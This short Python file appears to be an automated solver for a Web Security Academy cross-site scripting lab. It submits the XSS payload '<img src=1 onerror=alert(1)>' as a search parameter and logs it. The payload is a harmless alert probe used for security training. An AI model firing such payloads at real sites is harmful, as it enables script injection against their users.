from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "<img src=1 onerror=alert(1)>"

    session.get_path("/", params={"search": xss})
    logger.info("Searched the following payload:")
    logger.info(xss)
